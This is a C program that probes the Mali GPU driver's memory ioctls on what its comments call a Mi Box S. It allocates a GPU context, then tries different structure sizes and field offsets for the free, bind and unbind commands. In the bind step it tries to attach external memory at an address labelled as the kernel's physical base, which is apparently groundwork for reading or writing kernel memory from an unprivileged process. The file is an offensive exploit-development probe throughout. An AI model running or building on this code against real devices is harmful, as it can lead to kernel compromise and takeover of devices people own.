#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

/*
 * Strategy:
 * 1. Use ALLOC_MEM (confirmed size=40) to allocate memory and get a valid context
 * 2. Use the returned ctx handle to test BIND_MEM with different sizes
 * 3. Also test FREE_MEM and UNBIND_MEM sizes
 *
 * ALLOC_MEM confirmed: _IOWR(0x83, 0, 40) = 0xc0288300
 */

#define MALI_IOC_MEMORY_BASE 0x83
#define _MALI_UK_ALLOC_MEM  0
#define _MALI_UK_FREE_MEM   1
#define _MALI_UK_BIND_MEM   2
#define _MALI_UK_UNBIND_MEM 3

#define _IOWR(type, nr, size) \
    (((3) << 30) | ((size) << 16) | ((type) << 8) | (nr))

#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY (1 << 11)

/*
 * Known mali_uk_alloc_mem_s for Mi Box S (40 bytes total).
 * Standard layout (other devices):
 *   uint64_t ctx;          // 0-7
 *   uint32_t gpu_vaddr;    // 8-11
 *   uint32_t vsize;        // 12-15
 *   uint32_t psize;        // 16-19
 *   uint32_t flags;        // 20-23
 *   uint64_t backend_handle; // 24-31
 *   = 32 bytes (standard)
 *
 * Mi Box S is 40 bytes, so 8 bytes extra.
 * Possible extra fields: secure_shared_fd (int32 + padding = 8 bytes)
 */

typedef struct {
    uint64_t ctx;
    uint32_t gpu_vaddr;
    uint32_t vsize;
    uint32_t psize;
    uint32_t flags;
    uint64_t backend_handle;
    uint32_t extra1;  /* possible secure_shared_fd + padding */
    uint32_t extra2;
} mali_alloc_t;

static volatile int g_timeout = 0;
static void alarm_handler(int sig) { g_timeout = 1; }

static int do_alloc(int fd, mali_alloc_t *out) {
    memset(out, 0, sizeof(*out));
    out->psize = 0x1000; /* 4KB */
    out->vsize = 0x1000;
    /* ctx=0 means allocate new */

    unsigned int cmd = _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_ALLOC_MEM, 40);
    return ioctl(fd, cmd, out);
}

static int do_free(int fd, uint64_t ctx, int size) {
    uint8_t *buf = calloc(1, size + 8);
    if (!buf) return -1;
    *(uint64_t *)buf = ctx;  /* ctx at offset 0 */

    unsigned int cmd = _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_FREE_MEM, size);
    int ret = ioctl(fd, cmd, buf);
    int err = errno;
    free(buf);
    if (ret == 0) return 0;
    return -err;
}

static int do_bind(int fd, uint64_t ctx, uint32_t phys, int size) {
    uint8_t *buf = calloc(1, size + 8);
    if (!buf) return -999;

    /* ctx at offset 0 */
    *(uint64_t *)buf = ctx;

    /* We need to find where flags, phys_addr etc. are in the structure.
     * Since we don't know the exact layout, we'll try multiple offsets.
     *
     * Standard structure:
     *   ctx (8) + vaddr (4) + size (4) + flags (4) + padding (4) + union
     *   union starts at offset 24, with bind_ext_memory: phys_addr (4) + rights (4) + flags (4)
     *
     * Mi Box S struct is bigger, so everything shifts by 8 bytes.
     * Let's try putting EXTERNAL flag at offset 20 (after ctx=8, vaddr=4, size=4, ?=4)
     * and phys_addr at offset 28 (union shifted by 8 bytes).
     */

    /* Try multiple flag offsets */
    for (int flag_off = 16; flag_off <= 28; flag_off += 4) {
        *(uint32_t *)(buf + flag_off) = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
    }

    /* Try multiple phys offsets */
    for (int phys_off = 24; phys_off <= 48; phys_off += 4) {
        *(uint32_t *)(buf + phys_off) = phys;
    }

    alarm(3);
    g_timeout = 0;

    unsigned int cmd = _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_BIND_MEM, size);
    int ret = ioctl(fd, cmd, buf);
    int err = errno;

    alarm(0);
    free(buf);

    if (g_timeout) return -100; /* TIMEOUT */
    if (ret == 0) return 0;
    return -err;
}

int main() {
    signal(SIGALRM, alarm_handler);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("[*] BIND_MEM size probe (with valid ctx)\n");

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("open /dev/mali"); return 1; }
    printf("[+] opened /dev/mali fd=%d\n", fd);

    /* Step 1: Allocate memory to get a valid ctx */
    mali_alloc_t alloc;
    int ret = do_alloc(fd, &alloc);
    if (ret != 0) {
        printf("[-] ALLOC_MEM failed: ret=%d errno=%d\n", ret, errno);
        close(fd);
        return 1;
    }
    printf("[+] ALLOC_MEM success: ctx=0x%016llx gpu_vaddr=0x%08x\n",
           (unsigned long long)alloc.ctx, alloc.gpu_vaddr);

    /* Step 2: Test FREE_MEM sizes (quick, won't hang) */
    printf("\n=== FREE_MEM size probe ===\n");
    int free_sizes[] = {12, 16, 20, 24, 28, 32, 36, 40, 44, 48};
    for (int i = 0; i < 10; i++) {
        int sz = free_sizes[i];
        unsigned int cmd = _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_FREE_MEM, sz);
        /* Use a dummy ctx (0) for testing - should return EINVAL not ENOTTY if valid */
        int r = do_free(fd, 0, sz);
        if (r == 0)
            printf("  size=%2d  cmd=0x%08x  OK\n", sz, cmd);
        else if (r == -ENOTTY)
            printf("  size=%2d  cmd=0x%08x  ENOTTY\n", sz, cmd);
        else
            printf("  size=%2d  cmd=0x%08x  err=%d (ioctl EXISTS!)\n", sz, cmd, -r);
    }

    /* Step 3: Test BIND_MEM sizes */
    printf("\n=== BIND_MEM size probe ===\n");
    int bind_sizes[] = {32, 36, 40, 44, 48, 52, 56, 60, 64, 72, 80};
    int n_bind = sizeof(bind_sizes)/sizeof(bind_sizes[0]);

    uint32_t test_phys = 0x01080000; /* kernel phys base */

    for (int i = 0; i < n_bind; i++) {
        int sz = bind_sizes[i];
        unsigned int cmd = _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_BIND_MEM, sz);

        int r = do_bind(fd, alloc.ctx, test_phys, sz);

        if (r == 0)
            printf("  size=%2d  cmd=0x%08x  SUCCESS!\n", sz, cmd);
        else if (r == -ENOTTY)
            printf("  size=%2d  cmd=0x%08x  ENOTTY (wrong)\n", sz, cmd);
        else if (r == -100)
            printf("  size=%2d  cmd=0x%08x  TIMEOUT\n", sz, cmd);
        else
            printf("  size=%2d  cmd=0x%08x  err=%d (EXISTS)\n", sz, cmd, -r);
    }

    /* Step 4: Test UNBIND_MEM sizes */
    printf("\n=== UNBIND_MEM size probe ===\n");
    int unbind_sizes[] = {12, 16, 20, 24, 28, 32, 36, 40};
    for (int i = 0; i < 8; i++) {
        int sz = unbind_sizes[i];
        unsigned int cmd = _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_UNBIND_MEM, sz);
        uint8_t buf[64] = {0};
        *(uint64_t *)buf = alloc.ctx;
        alarm(2);
        g_timeout = 0;
        int r = ioctl(fd, cmd, buf);
        int e = errno;
        alarm(0);
        if (g_timeout)
            printf("  size=%2d  cmd=0x%08x  TIMEOUT\n", sz, cmd);
        else if (r == 0)
            printf("  size=%2d  cmd=0x%08x  OK\n", sz, cmd);
        else if (e == ENOTTY)
            printf("  size=%2d  cmd=0x%08x  ENOTTY\n", sz, cmd);
        else
            printf("  size=%2d  cmd=0x%08x  err=%d (EXISTS)\n", sz, cmd, e);
    }

    close(fd);
    printf("\n[*] done\n");
    return 0;
}
